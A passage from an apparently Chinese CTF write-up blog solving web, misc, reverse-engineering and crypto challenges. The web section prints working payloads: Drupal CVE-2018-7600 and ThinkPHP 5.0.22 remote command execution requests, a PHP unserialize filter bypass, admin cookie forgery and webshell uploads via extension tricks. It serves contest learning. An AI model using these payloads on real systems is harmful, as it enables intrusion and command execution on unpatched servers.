&#123;</span><br><span class="line">            $filename = &quot;./&#123;$this-&gt;file&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">if (isset($_GET[&apos;data&apos;]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[&apos;data&apos;];</span><br><span class="line">    preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;Hacker!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(&quot;./index.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><br>这一段代码话可以。。不是太难。我们需要定位到关键函数<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches);</code><a href="http://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">点击此处</a><br>还有反序列化，参开这个文章：<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a><br>只需要在对象长度前添加一个<code>+</code>号，即<code>让o:4</code>变成<code>o:+4</code>，这样就可以绕过正则匹配<br>So，最后payload：<code>O:+4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>但是一定要url编码一下再传进去<br><code>data=%4f%3a%2b%34%3a%22%62%61%62%79%22%3a%31%3a%7b%73%3a%34%3a%22%66%69%6c%65%22%3b%73%3a%38%3a%22%66%6c%61%67%2e%70%68%70%22%3b%7d</code><br><img src="/2018/12/22/anheng-12/1.jpg" alt=" "></p><h2 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h2><p>这个题目一打开并没有发现什么，所以我们扫一下后台，得到了<code>admin.php</code><br>但进去以后<br><img src="/2018/12/22/anheng-12/2.jpg" alt=" "><br>提示我们并不是admin，我们抓包看到<br><img src="/2018/12/22/anheng-12/3.jpg" alt=" "><br>这个user我们解码得到<code>user</code>所以我们的思路就是改一下cooikes，改成admin，base64编码一下<code>YWRtaW4=</code><br>题目对我不太友好、、、好几遍都进不去<br><img src="/2018/12/22/anheng-12/4.jpg" alt=" "><br>进去以后是个网站后台管理，可以访问一些文件<br><img src="/2018/12/22/anheng-12/5.jpg" alt=" "><br>试一下admin.php<br><img src="/2018/12/22/anheng-12/6.jpg" alt=" "><br>再读一下config.php，发现有过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function waf_exec($str)&#123;</span><br><span class="line">$black_str = &quot;/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i&quot;;</span><br><span class="line">$str = preg_replace($black_str, &quot;&quot;,$str);</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>很多符号都被过滤了，但是“$”,“/”没被过滤，所以可以匹配一下啦。<br>首先ls一下看看<br><img src="/2018/12/22/anheng-12/7.jpg" alt=" "><br><code>IFS 是一种 set 变量，当 shell 处理&quot;命令替换&quot;和&quot;参数替换&quot;时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</code><br><img src="/2018/12/22/anheng-12/8.jpg" alt=" "></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接给公众号发：蜗牛，再喊一句口号就行了</p><h2 id="juju"><a href="#juju" class="headerlink" title="juju"></a>juju</h2><p>打开压缩包发现是个超大png，结果binwalk以后发现一堆乱七八糟的，所以只好改一下图片高度试试<br>图片高度改成1080就好</p>]]></content>
    
    <summary type="html">
    
      安恒12月月赛
    
    </summary>
    
      <category term="Writeup" scheme="http://bobosec.top/categories/Writeup/"/>
    
    
      <category term="各类WP" scheme="http://bobosec.top/tags/%E5%90%84%E7%B1%BBWP/"/>
    
  </entry>
  
  <entry>
    <title>中国矿业大学第一次双月赛题目解析</title>
    <link href="http://bobosec.top/2018/12/16/cumt-match/"/>
    <id>http://bobosec.top/2018/12/16/cumt-match/</id>
    <published>2018-12-16T14:48:57.000Z</published>
    <updated>2018-12-18T09:54:16.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p><img src="/2018/12/16/cumt-match/ez1.jpg" alt=" "><br>打开题目发现是个上传webshell，所以我们想到上传一个木马，getshell，拿flag<br>这里需要用到BP还有一句话木马，不懂得可以百度一下<br><img src="/2018/12/16/cumt-match/ez2.jpg" alt=" "><br>这是我们的一句话木马上传，然后我们发现php后缀不能执行，所以我们得改一下后缀，经过测试发现，后缀为<code>php5</code>和<code>phtml</code>时可以执行<br><img src="/2018/12/16/cumt-match/ez3.jpg" alt=" "><br>这时候改完后缀我们发现上传成功，于是可以直接连中国菜刀（不懂百度中国菜刀就行）<br><img src="/2018/12/16/cumt-match/ez4.jpg" alt=" "><br>配置成功<br>直接去根目录读flag就行<br><img src="/2018/12/16/cumt-match/ez5.jpg" alt=" "></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>既然题目说了CVE，打开发现有一个power by<br><img src="/2018/12/16/cumt-match/cve1.jpg" alt=" "><br>于是就找这个框架的漏洞就行，payload 分为两个请求。 先将 Payload 注入缓存中，构造下面的payload，发送一个POST包<br><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">drupal7~8 CVE-2018-7600</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=user/password&amp;name[%23post_render][]=system&amp;name[%23markup]=cat%20../../../../../flag&amp;name[%23type]=markup HTTP/1.1</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure></p><p>这里注意一下参考文章里面的passthru命令用不了，只能改为system才能执行相关命令,所以上面缓存的时候换了用system函数<br><img src="/2018/12/16/cumt-match/cve2.jpg" alt=" "><br>在响应中找到form_build_id的值然后继续请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=file/ajax/name/%23value/form-qpnIm9H756D90crsuz61R9WE5xD4nsk6rqzUJ5cGRNU HTTP/1.1</span><br><span class="line"></span><br><span class="line">form_build_id=form-qpnIm9H756D90crsuz61R9WE5xD4nsk6rqzUJ5cGRNU</span><br></pre></td></tr></table></figure></p><p>再来一次cat /flag的操作就可以读取flag了<br><img src="/2018/12/16/cumt-match/cve3.jpg" alt=" "></p><h3 id="secret-system"><a href="#secret-system" class="headerlink" title="secret-system"></a>secret-system</h3><p><img src="/2018/12/16/cumt-match/system1.jpg" alt=" "><br>一进去之后会发现login功能没反应，而upload页面也需要管理员权限，肯定是要伪造自己是管理员的身份然后去挖掘文件上传的漏洞，查看源代码无果后顺手看看robots.txt,发现里面有登录的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br><span class="line">然后就可以进去登陆的页面，再次查看源代码发现作者的信息</span><br><span class="line">&lt;!-- </span><br><span class="line">*** author: cib_zhinianyuxin.com </span><br><span class="line">*** code: github.com </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><br>找到执念于心学长的github里项目的介绍</p><blockquote><p>It’s just a system which is not completed , there are some tips:</p><ol><li>you can use test/cib_sec to login ,but you are not admin!</li><li>only admin can upload file ,but whichone can not bypass my rules.</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;/**</span><br><span class="line">&gt;$sign = array(</span><br><span class="line">&gt;                    &apos;id&apos;=&gt;$model-&gt;id,</span><br><span class="line">&gt;                    &apos;name&apos;=&gt;$model-&gt;username,</span><br><span class="line">&gt;                    &apos;sign&apos;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">&gt;                );</span><br><span class="line">&gt;$_COOKIE[&apos;Cib_security&apos;] = serialize($sign);</span><br><span class="line">&gt;**/</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>查一下,发现可以用用户名：test 密码：cib_sec登录但不是admin，而且泄露的代码里面说明了可以伪造cookie，cookie名称是Cib_security，是一段经过序列化的东西，到时候就可以伪造了<br>以test身份登录后把cookie拿出来然后解码<br><img src="/2018/12/16/cumt-match/system2.jpg" alt=" "><br>然后把里面的MD5解一下发现是2test,那我们就构造一个1admin，构造如下的序列<br>a:3{s:2:”id”;i:1;s:4:”name”;s:5:”admin”;s:4:”sign”;s:32:”6c5de1b510e8bdd0bc40eff99dcd03f8”;}<br>然后需要url编码一下，保存一下cookie就可以以admin身份登录，接上来就是文件上传的部分了，这里的文件上传就是个很简单的后缀名绕过,这个后缀名有点偏，用的<code>pht</code>（和phtml差不多的东东）,然后发包上传一句话木马，菜刀链接，成功获取flag<br><img src="/2018/12/16/cumt-match/system3.jpg" alt=" "></p><h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><p><img src="/2018/12/16/cumt-match/shop1.jpg" alt=" "><br>这个是安恒10月月赛原题改编（话说这个改的真的太坑了）<br>这个题给了源码，先把源码给下载下来<br>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要888积分才可以购买，这个时候就感觉应该是越权购买flag<br>发现源码里面有数据库文件打开看一下，发现是存在管理员的<br><img src="/2018/12/16/cumt-match/shop2.jpg" alt=" "><br>并且id是16，而且他有30000积分，够买很多flag了，还有商品id 38也可以得知<br><img src="/2018/12/16/cumt-match/shop3.jpg" alt=" "><br>看到代码里面的setting文件，有从secret.key读出来的秘钥<code>zhinianyuxin/n</code>（这个回车害死多少人）<br><img src="/2018/12/16/cumt-match/shop4.jpg" alt=" "><br>看一下这一段代码<br><img src="/2018/12/16/cumt-match/shop5.jpg" alt=" "><br>这里可以看出单单对商品方做了校验(自检验)那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱<br>根据它里面的代码去构造signature就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import md5 </span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = &apos;zhinianyuxin\n&apos; </span><br><span class="line">form = &#123; </span><br><span class="line">&apos;order_id&apos;: &apos;119&apos;, </span><br><span class="line">&apos;buyer_id&apos;: &apos;16&apos;,   </span><br><span class="line">&apos;good_id&apos;: &apos;38&apos;,    </span><br><span class="line">&apos;buyer_point&apos;: &apos;200&apos;, </span><br><span class="line">&apos;good_price&apos;: &apos;50&apos;, </span><br><span class="line">&apos;order_create_time&apos;: &apos;1544796662.686132&apos; </span><br><span class="line">&#125; </span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + &apos;&amp;&apos;.join([f&apos;&#123;i&#125;=&#123;form[i]&#125;&apos; for i in form]) </span><br><span class="line">str2sign3= str2sign.encode(&apos;utf-8&apos;) </span><br><span class="line">sign = md5(str2sign3).hexdigest() </span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure><br>python脚本，跑一下就行<br>发包构造一下得到flag,注意红色的地方也要做相应的修改，发包得到flag<br><img src="/2018/12/16/cumt-match/shop6.jpg" alt=" "></p><h3 id="TP5"><a href="#TP5" class="headerlink" title="TP5"></a>TP5</h3><p><img src="/2018/12/16/cumt-match/TP1.jpg" alt=" "><br>因为题目说了：version is 5.0.22 ，所以想到thinkpho最近几天刚爆出来的tp5远程getshell的漏洞，直接上网搜payload，参考了这篇文章:<a href="https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig</a><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><br><img src="/2018/12/16/cumt-match/TP2.jpg" alt=" "><br>发现有回显<br>列一下文件看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../.././../../.././</span><br></pre></td></tr></table></figure><br><img src="/2018/12/16/cumt-match/TP3.jpg" alt=" "><br>发现有flag在根目录<br>最后获取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure></p><h3 id="shell"><a href="#shell" class="headerlink" title="shell?"></a>shell?</h3><p>这个题目由于特殊原因不能写的太详细，不过慢慢研究也能A了<br>这个题目上来注册进去发现只有一个上传的功能，尝试了一下发现不是普通的上传绕过的问题，于是随手测试了一下admin路径，居然真的有。。。然后这时候确定了用户名是admin，密码我们爆破一下（据说是我的字典比较秀，一下子就爆破出来了）密码是qwe123<br>登陆进去以后发现url是<code>file=</code>这个看着像文件包含，于是尝试读一下<code>etc/passwd</code>可以读到<br><img src="/2018/12/16/cumt-match/shell1.jpg" alt=" "><br>然后想的是直接读<code>upload.php</code>源码看一下过滤规则，但是！！发现了只要是包含<code>php</code>的都不行，大小写各种绕过也不行，走头无路、、、绝望.jpg<br>后面想可以利用刚刚普通用户上传的东西，然后去文件包含执行，于是就尝试了图片马，结果PHP的代码会被解析掉。。。。。<br>最后最后找到了各种奇奇怪怪的CTF姿势，终于！！！可以自己构造一个图片马，然后执行，再本地包含上去就直接被服务器解析了就行<br>然后就是常规操作，列目录拿flag（PS：难点在构造自己的php图片马，这次过滤真的tql、、、、）</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><blockquote><p>打的不好 re4没做出来<br>ak了密码学 但都挺简单的<br>打算慢慢退役算了 开学到现在其实都没在学23333</p></blockquote><h3 id="0x00-open-the-gate-of-RE"><a href="#0x00-open-the-gate-of-RE" class="headerlink" title="0x00 open the gate of RE"></a>0x00 open the gate of RE</h3><h4 id="前期分析"><a href="#前期分析" class="headerlink" title="前期分析"></a>前期分析</h4><p>一开始没找到关键的判断函数 程序也停不来下来<br>在下图地址处下断点 运行能看到关键的异或和判断汇编语句<br><img src="/2018/12/16/cumt-match/0x00-0.png" alt=""><br>动态调试 的样子<br><img src="/2018/12/16/cumt-match/0x00-1.png" alt=""></p><h4 id="流程概述"><a href="#流程概述" class="headerlink" title="流程概述"></a>流程概述</h4><ol><li>输入string</li><li>string按位与 <code>rdi</code> 里存的某一个值进行异或操作</li><li>运行到 <code>cmpsb</code>语句 和 程序内部的数据进行比较</li></ol><p>所以唯一不知道的就是 每次异或的那个值是啥<br>通过理清汇编的代码逻辑就能知道 rdi的值就是前一个字符的值</p><h4 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h4><ol><li>从倒数第二位开始 和后一位异或</li><li>并更新当前位的值</li></ol><h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=[0x17,0x12,0x1D,0x22,0x38,0x18,0x58,0x7E,0x2B,0x1C,0x04,0x59,0x6A,0x33,0x1F,0x2C</span><br><span class="line">,0x26,0x49,0x45,0x07,0x2D,0x39,0x2F,0x3B,0x47,0x41,0x2B,0x2D,0x17,0x13,0x13,0x17</span><br><span class="line">,0x47,0x50,0x3A,0x39,0x0A,0x4A,0x41,0x46,0x5C,0x7D]</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in range(len(a)-1,0,-1):</span><br><span class="line">    a[i-1]=a[i-1]^a[i]</span><br><span class="line">for i in a:</span><br><span class="line">    flag+=chr(i)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><code>ctf{Yay!_thl5_ls_y0ur_fIr5t_rever5e_fl&amp;g!}</code></p><h3 id="0x01-Fake"><a href="#0x01-Fake" class="headerlink" title="0x01 Fake"></a>0x01 Fake</h3><h4 id="前期分析-1"><a href="#前期分析-1" class="headerlink" title="前期分析"></a>前期分析</h4><p>输入的string经过固定的和伪随机数序列的异或后 在经过在经过下面函数的变换<br>动态调试才发现好像修改了got表 改了<code>memcmp</code>指向的地址 实际执行的是下图的函数<br><img src="/2018/12/16/cumt-match/0x01-1.png" alt=""><br><img src="/2018/12/16/cumt-match/check22.png" alt=""></p><h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><ol><li>输入的数据和 伪随机序列<code>Rand=[0x3D,0x1D,0x42,0xA5,0x4D,0xEA,0xDD,0xAC,0x94,0xBF,0xF0,0x6E,0x0A,0xF8,0xB3,0xCD,0x8E,0xFE,0x7A,0xFF,0xCA,0xF9,0x17,0x91,0xFE,0x0A,0x3E,0x98,0xDF]</code> 异或</li><li>进入循环 每次减去 当前下标前面所有位数的程序内部数据之和</li><li>和程序内部数据判断</li></ol><h4 id="解密流程分析"><a href="#解密流程分析" class="headerlink" title="解密流程分析"></a>解密流程分析</h4><p>直接动态调试 提取出最终数据前一步的数据 和伪随机数序列进行异或操作</p><h4 id="解密脚本-1"><a href="#解密脚本-1" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Rand=[0x0d,0x2c,0x70,0x96,0x79,0xdf,0xeb,0x9b,0xac,0x86,0xc0,0x5f,0x38,0xcb,0x87,0xf8,0xb8,0xc9,0x42,0xc6,0xfb,0xcb,0x24,0xa5</span><br><span class="line">,0xcb,0x3c,0x09,0xa0,0xe6]</span><br><span class="line">a=[0x6B,0x65,0x17,0xE3,0x0B,0xBA,0xB4,0xAB,0xD9,0xF2,0x9F,0x37,0x09,0xA1,0xE6,0xBB</span><br><span class="line">,0xD3,0x96,0x25,0x89,0x8F,0x94,0x02,0xCB,0xAF,0x63,0x7A,0xCD,0xA5]</span><br><span class="line">for i in range(0,29):</span><br><span class="line">    flag+=chr(a[i]^Rand[i])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><code>fIgure_0ut_h1jaCk_gOt_&amp;nd_smC</code></p><h3 id="easy-Algorithm"><a href="#easy-Algorithm" class="headerlink" title="easy Algorithm"></a>easy Algorithm</h3><h4 id="前期分析-2"><a href="#前期分析-2" class="headerlink" title="前期分析"></a>前期分析</h4><p>主要函数如下图 一开始 把输入的 16位<code>s</code>按四位分成四段 分别进行<code>40083C</code>函数和strtol()函数<br><img src="/2018/12/16/cumt-match/33-1.png" alt=""></p><p><code>40083C</code>里的函数有MD5算法的初始值 暂判断为MD5算法<br><br>通过动态调试 提取结果确定就是md5算法<br><img src="/2018/12/16/cumt-match/0x02-0.png" alt=""></p><p>if里一共有五次判断 第一处是对输入的s的四段的大小 判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return a1 &lt; a2 &amp;&amp; a2 &lt; a3 &amp;&amp; a3 &lt; a4 &amp;&amp; a1 &gt; 999 &amp;&amp; a2 &gt; 999 &amp;&amp; a3 &gt; 999 &amp;&amp; a4 &gt; 999;</span><br></pre></td></tr></table></figure><p>接下来<code>400BBE</code>函数 是四段flag 每段都判断一次<br><img src="/2018/12/16/cumt-match/33-2.png" alt=""></p><h4 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h4><ol><li>输入string 分成4*4段 s1 s2 s3 s4</li><li>每段进行MD5计算 得到 m1 m2 m2 m3</li><li>把输入的四段 s1-4 转成数字 得到 a1 a2 a3 a4</li><li>if里的第一个判断 要满足 <code>a1 &lt; a2 &amp;&amp; a2 &lt; a3 &amp;&amp; a3 &lt; a4 &amp;&amp; a1 &gt; 999 &amp;&amp; a2 &gt; 999 &amp;&amp; a3 &gt; 999 &amp;&amp; a4 &gt; 999</code> 所以输入的是 不能以0开头 且 每段递增 的四段四位数字</li><li>将 四段数字 和 计算得到MD5值 作为参数 进入<code>400BBE</code>函数<br>运算判断返回值</li></ol><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>所以完全可以四位四位爆破遍历 满足<code>400BBE</code>函数的输入<br></p><ol><li>遍历<code>1000-9999</code> 的4位数</li><li>计算对应的MD5</li><li>改写<code>400BBE</code>函数 判断参数为4位数和对应的MD5值时 最后的返回值是否为1</li></ol><h4 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">num=[0,1,2,3,4,5,6,7,8,9]</span><br><span class="line">for i in num[1:]:</span><br><span class="line">    for j in num:</span><br><span class="line">        for k in num:</span><br><span class="line">            for l in num:</span><br><span class="line">                s=[0]*4</span><br><span class="line">                v=[]*4</span><br><span class="line">                a=chr(i+48)+chr(j+48)+chr(k+48)+chr(l+48)</span><br><span class="line">                Md5 = hashlib.md5(a)</span><br><span class="line">                md5=Md5.hexdigest().decode(&apos;hex&apos;)</span><br><span class="line">                v.append((ord(md5[0])&amp;0x0f)+48)</span><br><span class="line">                v.append((ord(md5[0]) &gt;&gt; 4) + 48)</span><br><span class="line">                v.append((ord(md5[1]) &amp; 0xF) + 48)</span><br><span class="line">                v.append((ord(md5[1]) &gt;&gt; 4) + 48)</span><br><span class="line">                #print v</span><br><span class="line">                for p in range(0,4):</span><br><span class="line">                    for q in range(0,4):</span><br><span class="line">                        if s[q]==0 and v[q] == ord(a[p]):</span><br><span class="line">                            s[q]=1</span><br><span class="line">                            break</span><br><span class="line">                flag=0</span><br><span class="line">                for kk in range(0,4):</span><br><span class="line">                    if s[kk]==0:</span><br><span class="line">                        flag=1</span><br><span class="line">                        break</span><br><span class="line">                if(flag==0):</span><br><span class="line">                    print a</span><br></pre></td></tr></table></figure><p>得到正确的输入<br><img src="/2018/12/16/cumt-match/0x02-1.png" alt=""><br>输入得到flag<br><img src="/2018/12/16/cumt-match/333.png" alt=""></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="0x00-First-Level"><a href="#0x00-First-Level" class="headerlink" title="0x00 First Level"></a>0x00 First Level</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>文件里面有n 有e 也有c 所以一开始想到会不会是RSA<br><br>用yafu发现给的n能分解 </p><p><img src="/2018/12/16/cumt-match/0x03-1.png" alt=""></p><p>但发现一个问题 <code>e=2</code> RSA里要求<code>e</code>的取值需要和<code>φ(n)</code>互素 计算<code>φ(n)=(q-1)(p-1)</code>是<code>e=2</code>的倍数<br><br>所以不是RSA<br></p><p>在网上找到了Rabin密码 <br><br>是对RSA的一种改进 RSA基于指数同余<br>Rabin是基于二次同余Rabin中可以认为<code>e、d</code>是定值的RSA，<code>e=2,d=1/2</code><br>也就是说加密是<code>C=P^2（mod）N</code> 解密时<code>P=C^1/2（mod）N</code><br>Rabin密码系统中公钥是N 私钥是<code>tuple（p,q）</code><br>Rabin密码系统是不确定的 解密创建4个可能的明文</p><p>####解密脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">p= 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span><br><span class="line">q= 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span><br><span class="line">n = 803678453359654678294908849796070879683957150793334760331914564560436346246318146972037345532196144846302396231568208129578229658427016137015812294767829769526183110361155218973534132637868629878697276885010621667798340990722479232206539737134630022679611384856651457676742503181552612577723889148480371814427003519911887820259995809138224880985974019240787368063863785676352901706320933005866320209971047564687269855667449125006030388570791745025604012995932967808845626861494067477576269553063188942863345823904401993114875063039172398942273922006919297914636076165764724319820975790354316178447072264025710629612792744623493832043468536056092942850806682235592789516752472672702894552294332079944336742847297657777111820207270697743634301201554591025634597867621179900279341273373266922969077784989097180467385359637467960548625099446206714449802133881666168001526050626012123346093003692879254719481099405181507957042513412777445437991143507101426673368439550927862534716776799293748523014679560356204884432499174326668666155331266289275676407763431338435327338882392875844836751881757226026820173509270505776422652436206224746614491397668247316050974170122064912373180229234431227192655345960223082314479121823620163578746247313</span><br><span class="line">e = 2</span><br><span class="line">c = 499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span><br><span class="line"></span><br><span class="line">mp=pow(c,(p+1)/4,p)</span><br><span class="line">mq=pow(c,(q+1)/4,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span 